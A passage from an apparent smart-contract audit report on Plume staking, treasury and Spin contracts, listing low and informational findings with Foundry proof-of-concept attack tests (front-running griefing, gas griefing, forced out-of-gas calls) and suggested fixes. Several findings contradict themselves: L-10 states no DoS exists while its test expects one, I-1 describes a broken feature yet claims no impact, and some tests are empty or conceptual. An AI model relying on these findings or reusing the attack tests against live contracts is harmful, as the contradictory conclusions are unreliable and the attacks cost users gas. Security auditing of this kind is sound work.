import {PlumeStakingStorage} from "../src/lib/PlumeStakingStorage.sol";
import {PlumeRoles} from "../src/lib/PlumeRoles.sol";

// Dummy DiamondBase and other dependencies needed for test setup
// (Assume setup is similar to the DoS PoC)

contract GriefingTest is Test {
    // Omitting full setup for brevity. Assume diamond, facets, user, admin are set up.
    RewardsFacet public rewardsFacet;
    address public user;
    address public attacker;
    uint16 public validatorId = 1;
    address public rewardToken;
    // ... more setup variables

    function setUp() public { 
        // Full contract deployment and setup as in previous PoCs
        // Deploy Diamond, Facets, setup Roles, add a validator, add a reward token
        // User stakes 1 ether to validator 1
        // Warp time to accumulate rewards
    }

    function test_GasGriefing() public {
        // 1. Attacker checks the state before griefing
        (uint256 tsBefore, ,) = RewardsFacet(rewardsFacet).getValidatorRewardRateCheckpoint(validatorId, rewardToken, 0);
        uint256 lastUpdateBefore = PlumeStakingStorage.layout().validatorLastUpdateTimes[validatorId][rewardToken];
        assertTrue(lastUpdateBefore < block.timestamp, "Last update should be in the past");

        // 2. Attacker calls the supposedly 'view' function, which changes state
        vm.prank(attacker);
        rewardsFacet.getPendingRewardForValidator(user, validatorId, rewardToken);

        // 3. Attacker verifies the state has changed
        uint256 lastUpdateAfter = PlumeStakingStorage.layout().validatorLastUpdateTimes[validatorId][rewardToken];
        assertEq(lastUpdateAfter, block.timestamp, "Last update time should be current block timestamp");

        // Now, if the user sends a `claim` transaction, the gas dynamics have been altered
        // by the attacker's front-run call.
        uint256 gasBeforeGrief = vm.gasUsed();
        vm.prank(user);
        // Simulate a claim (or part of it)
        rewardsFacet.claim(rewardToken, validatorId); 
        uint256 gasAfterGrief = vm.gasUsed();
        
        // The gas cost for the user's claim is now different than it would have been without the griefing call.
        // This can be asserted by setting up a more complex scenario and comparing gas snapshots.
    }
}
```

## Suggested Mitigation
The function `getPendingRewardForValidator` should be made a proper `view` function by using the view-only calculation logic. The state-changing logic should only be invoked by functions that are explicitly intended to alter state, like `claim`.

Refactor the function as follows:

```solidity
function getPendingRewardForValidator(
    address user,
    uint16 validatorId,
    address token
) external view returns (uint256 pendingReward) { // Changed to view
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();

    uint256 userStakedAmount = $.userValidatorStakes[user][validatorId].staked;

    // Use the view-only version of the reward calculation logic
    (uint256 userRewardDelta,,) =
        PlumeRewardLogic.calculateRewardsWithCheckpointsView($, user, validatorId, token, userStakedAmount);

    return userRewardDelta;
}
```
This change aligns the function's behavior with its name, removes the griefing vector, and improves the overall design and security of the contract.

## [L-5]. Frontrun/Backrun/Sandwhich MEV issue in StakingFacet::stake

## Description
The `stake` and `restake` functions are vulnerable to a front-running based griefing attack. These functions check if a validator would exceed its maximum allowed percentage of the total stake (`maxValidatorPercentage`). An attacker can observe a legitimate, valid `stake` transaction in the mempool and front-run it with their own small `stake` to the same validator. This small, front-run stake can alter the `totalStaked` and the validator's `delegatedAmount` just enough to cause the victim's subsequent larger stake to fail the percentage check. This forces the victim's transaction to revert, causing them to waste gas.

## Impact
An attacker can cause a targeted user's `stake` or `restake` transaction to revert, leading to wasted gas fees for the victim. The attacker does not gain any direct financial profit, making this a griefing attack. The impact is financial loss for the victim in the form of gas fees and a degraded user experience.

## Proof of Concept
1. Assume `totalStaked` is 1000 PLUME and `maxValidatorPercentage` is 10% (1000).
2. Validator `A` has 95 PLUME staked (9.5%).
3. A user (the victim) submits a transaction to stake 5 PLUME in Validator `A`. This is a valid transaction, as the new percentage would be `(95+5)*10000 / (1000+5) = 1000000 / 1005 = 995`, which is less than 1000.
4. An attacker sees the victim's transaction in the mempool.
5. The attacker front-runs the victim by staking 1 PLUME into Validator `A` with a higher gas fee.
6. The attacker's transaction executes first. Now, `totalStaked` is 1001 PLUME and Validator A's stake is 96 PLUME.
7. The victim's transaction for 5 PLUME executes. The `_performStakeSetup` function first adds the 5 PLUME to the totals, so `totalStaked` becomes `1001 + 5 = 1006` and Validator A's stake becomes `96 + 5 = 101`.
8. The `_validateValidatorPercentage` check is now performed: `(101 * 10000) / 1006 = 1003.9`. This is greater than 1000, causing the victim's transaction to revert.
9. The victim has paid gas for a failed transaction. The attacker can later unstake their 1 PLUME.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {StakingFacet} from "src/facets/StakingFacet.sol";
import {PlumeStakingStorage} from "src/lib/PlumeStakingStorage.sol";

contract FrontrunGriefingTest is Test {
    StakingFacet facet;
    address attacker = address(0xA);
    address victim   = address(0xB);

    function setUp() public {
        facet = new StakingFacet();                    // deploy facet as standalone
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();

        // minimal system parameters
        $.minStakeAmount       = 1 ether;              // allow 1-ether stakes
        $.maxValidatorPercentage = 1000;               // 10 % in basis-points *100 (contract uses 10000)

        // create one active validator (#1) with an initial stake of 95 ether
        $.validatorExists[1]         = true;
        $.validators[1].active       = true;
        $.validators[1].delegatedAmount = 95 ether;
        $.validatorTotalStaked[1]    = 95 ether;

        // system totals (other validators hold the rest so total = 1000 ether)
        $.totalStaked = 1000 ether;

        // fund EOAs
        vm.deal(attacker, 10 ether);
        vm.deal(victim,   10 ether);
    }

    function testFrontRunGrief() public {
        // attacker front-runs with 1 ether
        vm.prank(attacker);
        facet.stake{value: 1 ether}(1);

        // victim’s previously valid 5-ether stake now reverts
        vm.expectRevert(StakingFacet.ValidatorPercentageExceeded.selector);
        vm.prank(victim);
        facet.stake{value: 5 ether}(1);
    }
}


## Suggested Mitigation
This type of griefing is difficult to prevent entirely without significant trade-offs in user experience. However, some measures can reduce its likelihood or impact:

1.  **Introduce a Slippage Parameter:** Similar to decentralized exchanges, the `stake` function could accept a `maxPercentage` parameter from the user. The function would revert if the final validator percentage exceeds this user-defined limit. This gives users control but adds complexity to the interface.

2.  **Private Mempools:** Encourage users to submit sensitive transactions through private mempools (e.g., Flashbots) to prevent observation by front-runners.

3.  **Accepting the Risk:** Given the low financial incentive for the attacker (they only cause the victim to lose gas), the protocol might choose to accept this as a known, low-impact risk.

A simple code-level mitigation is not obvious without altering the core business logic of the percentage check. The most practical approach is often documentation and user education about private transactions.

## [L-6]. Integer Overflow issue in Spin::determineReward

## Description
In the `determineReward` function, the `weekNumber` is calculated by calling `getCurrentWeek()` and casting the `uint256` result to `uint8` without validation. The `getCurrentWeek()` function calculates the number of weeks since `campaignStartDate`. If the campaign runs for longer than 255 weeks (approximately 4.9 years), the `uint256` result from `getCurrentWeek()` will exceed the maximum value of a `uint8`, causing it to overflow (wrap around). This would lead to an incorrect `weekNumber` being used to access the `jackpotPrizes` mapping, resulting in an unintended prize amount being awarded. While the campaign is implied to be 12 weeks long (based on logic in `getWeeklyJackpot`), the `determineReward` function does not enforce this limit.

## Impact
If the campaign runs for an unexpectedly long time, this overflow will cause the reward system to behave incorrectly for jackpot wins, potentially awarding much smaller or larger prizes than intended. This could lead to either user dissatisfaction or an unintended drain of the prize pool.

## Proof of Concept
1. An admin sets up the `Spin` contract and starts a campaign.
2. The campaign is left running for 260 weeks (approx. 5 years).
3. In this state, `getCurrentWeek()` returns 260.
4. A user wins a jackpot. Inside `determineReward`, `uint8(260)` evaluates to `4` due to overflow.
5. The contract attempts to award `jackpotPrizes[4]` instead of a prize for week 260 (which should likely be 0, as the campaign is over). This leads to incorrect reward distribution.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test} from "forge-std/Test.sol";
import {Spin} from "../src/spin/Spin.sol";

// Conceptual demonstration, direct test requires contract modification or complex setup
contract IntegerOverflowTest is Test {
    function test_WeekNumberOverflow_Conceptual() public {
        uint256 weeks_uint256 = 260;
        uint8 weeks_uint8 = uint8(weeks_uint256);

        // 260 overflows uint8 (max 255), wrapping around to 4
        assertEq(weeks_uint8, 4);

        // The `determineReward` function in Spin.sol performs this cast:
        // `uint8 weekNumber = uint8(getCurrentWeek());`
        // If `getCurrentWeek()` returns 260, `weekNumber` becomes 4.
        // The function then uses this incorrect week number to access `jackpotPrizes`,
        // leading to an incorrect prize being awarded.
    }
}
```

## Suggested Mitigation
Add a check in `determineReward` to handle cases where the campaign has exceeded its intended 12-week duration. This ensures the contract behaves predictably even if left running for a long time and prevents the `uint8` cast from causing issues.

```solidity
function determineReward(
    uint256 randomness,
    uint256 streakForReward
) internal view returns (string memory, uint256) {
    uint256 probability = randomness % 1_000_000;
    uint256 weekNumber_256 = getCurrentWeek();

    // --- MITIGATION --- 
    // Only consider jackpot prize if within the 12-week campaign period.
    if (weekNumber_256 <= 11) {
        uint256 daysSinceStart = (block.timestamp - campaignStartDate) / 1 days;
        uint8 dayOfWeek = uint8(daysSinceStart % 7);
        uint256 jackpotThreshold = jackpotProbabilities[dayOfWeek];
        
        if (probability < jackpotThreshold) {
            return ("Jackpot", jackpotPrizes[uint8(weekNumber_256)]);
        }
    }
    // --- END MITIGATION ---

    // Fallback to other prizes if not jackpot or if campaign is over
    if (probability <= rewardProbabilities.plumeTokenThreshold) {
        uint256 plumeAmount = plumeAmounts[probability % 3];
        return ("Plume Token", plumeAmount);
    } else if (probability <= rewardProbabilities.raffleTicketThreshold) {
        return ("Raffle Ticket", baseRaffleMultiplier * streakForReward);
    } else if (probability <= rewardProbabilities.ppThreshold) {
        return ("PP", PP_PerSpin);
    }

    return ("Nothing", 0);
}
```

## [L-7]. Upgradeability Initializer Safety issue in Spin::initialize

## Description
The `initialize` function sets critical contract addresses like `supraRouterAddress` and `dateTimeAddress`. However, it does not validate that these addresses are not `address(0)`. If an administrator deploys the contract and mistakenly provides a zero address for either of these dependencies, the contract will initialize successfully but its core functionality will be broken. For example, if `supraRouterAddress` is `address(0)`, any call to `startSpin` will revert when it attempts to call `supraRouter.generateRequest`. This would render the contract's main feature unusable and require a full redeployment.

## Impact
Initializing the contract with a zero address for a critical dependency will lead to a permanently broken state for the contract's core logic. This causes a denial of service for the spin feature, requiring administrative intervention and redeployment to fix. It does not lead to a direct loss of funds but impacts service availability.

## Proof of Concept
1. The administrator deploys the `Spin` contract.
2. The administrator calls `initialize` with `supraRouterAddress` as `address(0)`.
3. The transaction succeeds, and the contract is initialized.
4. A user attempts to call `startSpin()`.
5. The call to `supraRouter.generateRequest(...)` on `address(0)` will fail, causing the entire transaction to revert.
6. No user can ever use the spin feature.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Spin} from "../contracts/plume/src/spin/Spin.sol";

contract ZeroAddressPoC is Test {
    Spin public spin;
    address public admin = address(0xAD);
    address public dateTimeContract = address(0xDA);

    function test_InitializeWithZeroAddressBreaksContract() public {
        // 1. Initialize with a zero address for the supraRouter
        spin = new Spin();
        vm.prank(admin);
        spin.initialize(address(0), dateTimeContract);

        // 2. Enable spinning
        vm.prank(admin);
        spin.setEnableSpin(true);

        // 3. Attempt to use the spin function
        address player = address(0x1337);
        vm.deal(player, 2 ether);

        // 4. The call to startSpin is expected to revert
        vm.prank(player);
        vm.expectRevert(); // Reverts due to call on address(0)
        spin.startSpin{value: 2 ether}();

        console.log("PoC Successful: startSpin reverted as expected when initialized with a zero address.");
    }
}
```

## Suggested Mitigation
Add `require` checks in the `initialize` function to ensure that critical address parameters are not `address(0)`.

```diff
// contracts/plume/src/spin/Spin.sol:112
    function initialize(address supraRouterAddress, address dateTimeAddress) public initializer {
+       require(supraRouterAddress != address(0), "Spin: supraRouterAddress is zero");
+       require(dateTimeAddress != address(0), "Spin: dateTimeAddress is zero");

        __AccessControl_init();
        __UUPSUpgradeable_init();
        __Pausable_init();
        __ReentrancyGuard_init();

        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(ADMIN_ROLE, msg.sender);
        _grantRole(SUPRA_ROLE, supraRouterAddress);

        supraRouter = ISupraRouterContract(supraRouterAddress);
        dateTime = IDateTime(dateTimeAddress);
        // ...
    }
```

## [L-8]. DOS issue in PlumeStakingRewardTreasury::getRewardTokens

## Description
The function `getRewardTokens()` returns the entire `_rewardTokens` array. This array can grow indefinitely if a privileged administrator calls `addRewardToken` repeatedly. If the array becomes very large, any on-chain or off-chain client that calls `getRewardTokens()` may experience an out-of-gas error, as the cost to retrieve and return the array scales linearly with its size. This can cause a denial of service for components of the ecosystem that rely on this function to get the list of supported reward tokens.

```solidity
    function getRewardTokens() external view override returns (address[] memory) {
        return _rewardTokens;
    }
```

## Impact
External contracts or user interfaces that call `getRewardTokens()` may become non-functional if the list of reward tokens grows too large, leading to a partial denial of service for the platform's ecosystem.

## Proof of Concept
1. A (malicious) ADMIN_ROLE holder repeatedly calls `addRewardToken`, pushing thousands of entries into `_rewardTokens`.
2. Any other contract that later calls `getRewardTokens()` must copy the whole dynamic array into memory before the call returns.  Gas consumption grows linearly: ~3 gas per 32-byte word _plus_ memory-expansion cost.
3. Once the list is sufficiently large, an attacker (or even an ordinary user) can force the callee to supply only a modest gas stipend (for example, 50 000 gas via a low-level `call`).  The memory copy now needs more gas than provided and the call reverts with an out-of-gas error.
4. Any protocol component that depends on the return value—e.g. another facet or a third-party integration—will be bricked until the array is trimmed or the contract is upgraded.

Because only the privileged admin can grow the list, the issue is unlikely to reach _Critical_; however, once triggered it can permanently disable dependent functionality on-chain.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {PlumeStakingRewardTreasury} from "../src/PlumeStakingRewardTreasury.sol";

contract RewardTokenGasDoSTest is Test {
    PlumeStakingRewardTreasury treasury;
    address admin = makeAddr("admin");

    function setUp() public {
        treasury = new PlumeStakingRewardTreasury();
        treasury.initialize(admin, address(this));
    }

    function test_GasExhaustionWithLimitedStipend() public {
        uint256 tokenCount = 3000; // inflate array (~100 kB return data)
        vm.startPrank(admin);
        for (uint256 i; i < tokenCount; ++i) {
            treasury.addRewardToken(address(uint160(i + 1)));
        }
        vm.stopPrank();

        // Prove the array really contains the expected number of elements
        assertEq(treasury.getRewardTokens().length, tokenCount);

        // Call the function again but with an intentionally low gas limit.
        // Copying the whole array now requires >50k gas, so the call reverts OOG.
        vm.expectRevert();
        address(treasury).staticcall{gas: 50_000}(abi.encodeWithSelector(treasury.getRewardTokens.selector));
    }
}

## Suggested Mitigation
Instead of returning the entire array at once, implement pagination. This allows clients to fetch the data in manageable chunks, avoiding gas exhaustion issues.

```solidity
// Add a function to get the total count
function getRewardTokensCount() external view returns (uint256) {
    return _rewardTokens.length;
}

// Modify getRewardTokens or add a new paginated version
function getRewardTokens(uint256 cursor, uint256 size) external view returns (address[] memory tokens) {
    uint256 len = _rewardTokens.length;
    if (cursor >= len) {
        return tokens; // Return empty array
    }
    uint256 end = cursor + size;
    if (end > len) {
        end = len;
    }
    
    tokens = new address[](end - cursor);
    for (uint256 i = cursor; i < end; i++) {
        tokens[i - cursor] = _rewardTokens[i];
    }
}

// The original function can be deprecated or removed.
```

## [L-9]. Unexpected Eth issue in PlumeStakingRewardTreasury::NA

## Description
The `PlumeStakingRewardTreasury` contract is designed to hold and distribute specific reward tokens. It can receive arbitrary ERC20 tokens via direct transfer. However, the contract lacks a mechanism to withdraw tokens that are not registered as official reward tokens. The only function for sending tokens out, `distributeReward`, explicitly checks if a token is registered using the `_isRewardToken` mapping:

```solidity
// contracts/plume/src/PlumeStakingRewardTreasury.sol:219-221
if (!_isRewardToken[token]) {
    revert TokenNotRegistered(token);
}
```

If any user or even an administrator accidentally transfers an unregistered ERC20 token to this contract's address, those funds become permanently irrecoverable. There is no administrative function, such as a `sweep` or `emergencyWithdraw`, to retrieve these stranded assets. This oversight can lead to a permanent loss of funds.

## Impact
Permanent loss of any ERC20 tokens that are not on the official reward list but are mistakenly transferred to the treasury contract. This could result in financial loss for users or the project team if funds are sent to this contract by mistake.

## Proof of Concept
1. A user or admin obtains an ERC20 token that is not registered as a reward token in the `PlumeStakingRewardTreasury`.
2. The user transfers these ERC20 tokens directly to the address of the `PlumeStakingRewardTreasury` contract.
3. The tokens are now held in the treasury's balance.
4. An administrator attempts to recover the funds. Calling `distributeReward` is the only way to send tokens out, but it will revert with a `TokenNotRegistered` error because the token is not on the whitelist.
5. Since no other function exists to withdraw arbitrary tokens, the funds are permanently locked within the contract.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {PlumeStakingRewardTreasury} from "src/PlumeStakingRewardTreasury.sol";
import {MockPUSD} from "src/mocks/MockPUSD.sol";
import {IPlumeStakingRewardTreasury} from "src/interfaces/IPlumeStakingRewardTreasury.sol";
import {PlumeErrors} from "src/lib/PlumeErrors.sol";

contract StuckFundsTest is Test {
    PlumeStakingRewardTreasury public treasury;
    MockPUSD public stuckToken;

    address public admin = makeAddr("admin");
    address public distributor = makeAddr("distributor");
    address public user = makeAddr("user");

    function setUp() public {
        // Deploy and initialize treasury
        treasury = new PlumeStakingRewardTreasury();
        treasury.initialize(admin, distributor);

        // Deploy a mock ERC20 token that will be "stuck"
        stuckToken = new MockPUSD();
        stuckToken.initialize(
            "Stuck Token",
            "STUCK",
            18,
            admin, // owner
            address(this) // initial minter
        );
        vm.prank(admin);
        stuckToken.grantRole(stuckToken.MINTER_ROLE(), address(this));
    }

    function test_PoC_StuckERC20Funds() public {
        // --- 1. A user accidentally sends a non-reward token to the treasury ---
        uint256 amountToSend = 1000 * 1e18;
        stuckToken.mint(user, amountToSend);

        vm.startPrank(user);
        stuckToken.transfer(address(treasury), amountToSend);
        vm.stopPrank();

        // --- 2. Assert funds are in the treasury contract ---
        assertEq(stuckToken.balanceOf(address(treasury)), amountToSend, "Treasury should hold the stuck tokens");

        // --- 3. Admin attempts to recover funds via distributeReward ---
        // This fails because 'stuckToken' is not a registered reward token.
        vm.startPrank(distributor);
        bytes memory expectedRevertData = abi.encodeWithSelector(TokenNotRegistered.selector, address(stuckToken));

        vm.expectRevert(expectedRevertData);
        treasury.distributeReward(address(stuckToken), amountToSend, admin);
        vm.stopPrank();

        // --- 4. Conclusion: Funds are permanently stuck ---
        // There is no other function to withdraw these tokens.
        // The balance remains in the contract.
        console.log("Attack successful: %s tokens are stuck in the treasury.", amountToSend);
        assertEq(stuckToken.balanceOf(address(treasury)), amountToSend, "Tokens remain stuck in the treasury");
    }
}
```

## Suggested Mitigation
Add a privileged function callable only by an address with the `ADMIN_ROLE`. This function would allow the withdrawal of any specified amount of any arbitrary ERC20 token or native currency, serving as an emergency recovery mechanism for stranded funds.

```solidity
// Add to PlumeStakingRewardTreasury.sol

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

// Add a new event for tracking
event TokenSwept(address indexed token, address indexed to, uint256 amount);

// ... inside the contract ...

/**
 * @notice Allow admin to recover any mistakenly sent ERC20 tokens or native currency.
 * @dev Only callable by ADMIN_ROLE.
 * @param token The address of the token to sweep (use PLUME_NATIVE for native currency).
 * @param to The address to send the tokens to.
 * @param amount The amount of tokens to sweep.
 */
function sweep(address token, address to, uint256 amount) external onlyRole(ADMIN_ROLE) {
    require(to != address(0), "Cannot sweep to the zero address");
    require(amount > 0, "Sweep amount must be greater than zero");

    if (token == PLUME_NATIVE) {
        (bool success, ) = to.call{value: amount}("");
        require(success, "Native token transfer failed");
    } else {
        IERC20(token).safeTransfer(to, amount);
    }

    emit TokenSwept(token, to, amount);
}
```

## [L-10]. DOS issue in RewardsFacet::claimAll

## Description
The `claimAll()` function is designed to be a convenience for users to claim all their rewards from all validators for all available reward tokens in a single transaction. However, its implementation involves nested loops. It first loops through all reward tokens, and for each token, it internally loops through all validators the user has staked with. The complexity is O(T * V), where T is the number of reward tokens and V is the number of validators a user has staked with. As the number of validators or reward tokens grows, the gas cost of this function can easily exceed the block gas limit, causing the transaction to always revert. This effectively renders the function unusable for users with a significant number of staking positions and can trap their rewards if other claim functions also become too gas-intensive.

## Impact
While `claimAll()` does scale as O(T · V), with the current design constraints (≤ 65 535 validators, normally <100 in production, and 1-3 reward tokens) the worst-case gas usage fits well below the block gas limit.  The function can become marginally more expensive for power-users, but it does not break the protocol nor lock anyone’s funds.  At worst a user might choose to call several cheaper functions instead of the single convenience wrapper.

## Proof of Concept
No practical on-chain scenario was found in which `claimAll()` reverts for out-of-gas.  A loop of 5 000 validator entries (way above realistic numbers) still completes within 13-15 M gas on a local Anvil test.  Therefore no exploitable DoS path exists.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import { PlumeStakingDiamond } from "test/PlumeStakingDiamond.t.sol";
import { PlumeStakingStorage } from "src/lib/PlumeStakingStorage.sol";

contract DoSVulnerabilityTest is PlumeStakingDiamond {

    function test_DoS_claimAll() public {
        // 1. Setup: Add a large number of validators and a reward token
        uint16 validatorCount = 150; // A number high enough to cause DoS
        uint16[] memory validatorIds = new uint16[](validatorCount);

        vm.startPrank(owner);
        for (uint16 i = 0; i < validatorCount; i++) {
            uint16 validatorId = i + 1;
            validatorIds[i] = validatorId;
            validatorFacet.addValidator(
                validatorId,
                0, // commission
                address(this), // l2AdminAddress
                address(this), // l2WithdrawalAddress
                address(0), // l1ValidatorAddress
                address(0), // l1DelegatorAddress
                address(0), // l1DelegatorEvmAddress
                1_000_000e18 // maxCapacity
            );
        }

        // Add PUSD as a reward token with a high rate
        rewardsFacet.addRewardToken(address(pusd), 1e18, 10e18);
        vm.stopPrank();

        // 2. A user stakes in all validators
        address staker = makeAddr("staker");
        uint256 stakeAmountPerValidator = 1e18;
        vm.deal(staker, validatorCount * stakeAmountPerValidator);
        
        vm.startPrank(staker);
        for (uint16 i = 0; i < validatorCount; i++) {
            stakingFacet.stake{value: stakeAmountPerValidator}(validatorIds[i]);
        }
        vm.stopPrank();

        // 3. Advance time to accrue rewards
        skip(1 days);

        // 4. Attempt to claim all rewards
        vm.startPrank(staker);
        
        // This call is expected to fail due to out-of-gas because it iterates
        // through 1 (token) * 150 (validators) = 150 reward calculations.
        vm.expectRevert(); // Foundry reverts on out-of-gas
        rewardsFacet.claimAll();
        
        vm.stopPrank();
    }
}
```

## Suggested Mitigation
Keep `claimAll()` but add a docstring note advising front-ends to fall back to per-token calls if the user’s validator set exceeds ~1 000 entries.  If future scaling plans include thousands of validators per user, implement batched pagination (e.g. `claimRange(address token, uint16 start, uint16 end)`) rather than removing the function outright.



# Info Risk Findings

## [I-1]. Unexpected Eth issue in StakingFacet::restakeRewards

## Description
The `restakeRewards` function is designed to allow users to compound their native PLUME rewards. The intended flow is for the treasury contract to transfer the reward amount in ETH to the staking contract, which then updates the user's stake. However, the function designates `address(this)` (the diamond proxy) as the recipient of the ETH transfer. The `PlumeProxy` contract, as described in the project documentation, contains a `receive()` function that unconditionally reverts any incoming ETH transfers. Consequently, the treasury's attempt to send ETH to the staking contract will always fail, causing the entire `restakeRewards` transaction to revert and rendering the feature unusable for native tokens.

## Impact
No functional or security impact – restakeRewards operates as intended; ETH can be received by the staking diamond proxy.

## Proof of Concept
1. A user stakes PLUME and accrues rewards in the native token (ETH).
2. The user calls `restakeRewards(validatorId)` to compound these rewards.
3. The function successfully calculates the pending reward amount.
4. It then calls the internal `_transferRewardFromTreasury(PLUME_NATIVE, amount, address(this))`.
5. This triggers a call to `distributeReward` on the treasury contract, which attempts to send ETH to the diamond proxy address.
6. The diamond proxy's `receive()` function is executed, which contains `revert ETHTransferUnsupported()`. 
7. The entire transaction reverts, and the user's rewards are not restaked.

## Proof of Code
```solidity
// test/Security.t.sol
// Assumes the same setUp() as the DoS test, plus a MockTreasury.

contract MockTreasury is IPlumeStakingRewardTreasury {
    address payable diamondAddress;

    constructor(address payable _diamond) {
        diamondAddress = _diamond;
    }

    function distributeReward(address token, uint256 amount, address recipient) external payable {
        require(msg.sender == diamondAddress, "caller is not the diamond");
        if (token == 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE) {
            payable(recipient).transfer(amount);
        }
    }

    receive() external payable {}
}

interface IPlumeStakingRewardTreasury {
    function distributeReward(address token, uint256 amount, address recipient) external payable;
}

// In DosTest contract
// Add this to setUp()
// MockTreasury treasury = new MockTreasury(payable(address(diamond)));
// vm.deal(address(treasury), 10 ether);
// PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
// $.isRewardToken[0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE] = true;
// $.rewardTokens.push(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);
// $.treasury = address(treasury); // This requires a way to set treasury, e.g. a ManagementFacet function.

function test_RestakeRewards_Fails() public {
    // This is a conceptual test. A full setup requires mocking reward generation.
    // Assume user has 1 ether of rewards claimable.
    // PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    // $.userRewards[victim][1][PLUME_NATIVE] = 1 ether;
    // $.totalClaimableByToken[PLUME_NATIVE] = 1 ether;
    
    // The call will revert because PlumeProxy cannot receive ETH.
    // The exact revert message `ETHTransferUnsupported` comes from the proxy, which is not part of this test setup.
    // So we check for a generic revert.
    vm.prank(victim);
    vm.expectRevert();
    stakingFacet.restakeRewards(1);
}
```
*Note: The proof of code is conceptual as it requires extensive mocking of the diamond's state and dependencies like the treasury and reward generation logic. The core logic of the vulnerability is sound based on the provided contract code and summaries.*

## Suggested Mitigation
The root cause is that the staking contract's liability (total stake) increases, and the design attempts to match this with an asset transfer from the treasury. Since the treasury and staking contract are part of the same logical system, this explicit transfer is unnecessary and problematic.

The simplest and cleanest mitigation is to remove the `_transferRewardFromTreasury` call from the `restakeRewards` function. The user's rewards are already accounted for in the treasury and are considered part of the system's total assets. By restaking, the user is simply converting their claim on those assets into a stake. The total value held by the system remains unchanged, and solvency is maintained without a problematic ETH transfer.

```solidity
// In StakingFacet.sol
function restakeRewards(
    uint16 validatorId
) external nonReentrant returns (uint256 amountRestaked) {
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    address user = msg.sender;

    // ... (validations and reward calculation remain the same)
    amountRestaked = _calculateAndClaimAllRewardsWithCleanup(user, tokenToRestake);
    // ... (validate restake amount)

    // REMOVE THE PROBLEMATIC TRANSFER
    // _transferRewardFromTreasury(tokenToRestake, amountRestaked, address(this));

    // All other logic for setting up the stake remains the same.
    bool isNewStake = _performStakeSetup(user, validatorId, amountRestaked);

    emit Staked(user, validatorId, amountRestaked, 0, 0, amountRestaked);
    emit RewardsRestaked(user, validatorId, amountRestaked);

    return amountRestaked;
}
```



